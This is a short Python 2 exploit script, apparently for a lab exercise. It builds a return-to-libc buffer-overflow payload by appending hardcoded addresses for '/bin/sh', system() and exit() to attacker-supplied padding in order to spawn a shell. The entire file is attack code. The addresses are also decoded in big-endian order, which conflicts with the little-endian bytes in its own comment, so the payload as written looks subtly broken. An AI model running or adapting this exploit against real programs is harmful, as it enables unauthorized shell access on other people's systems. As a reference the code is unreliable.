#!/usr/bin/env python
#Modified from https://niiconsulting.com/checkmate/2019/09/exploiting-buffer-overflow-using-return-to-libc/

#\x60\x3d\xde\xf7\xff\x7f\x00\x00\xf0\x85\xdd\xf7\xff\x7f\x00\x00\x9e\xb6\xf6\xf7\xff\x7f\x00\x00

import struct
import sys

binsh = "00007ffff7f6b698".decode('hex')
syst = "00007ffff7de3d60".decode('hex')
exit = "00007ffff7dd85f0".decode('hex')

#buff = b"2\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6A"
#buff = b"2\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8A"
buff = sys.argv[1].encode('ascii')
buff += binsh
buff += syst
buff += exit

print(buff)
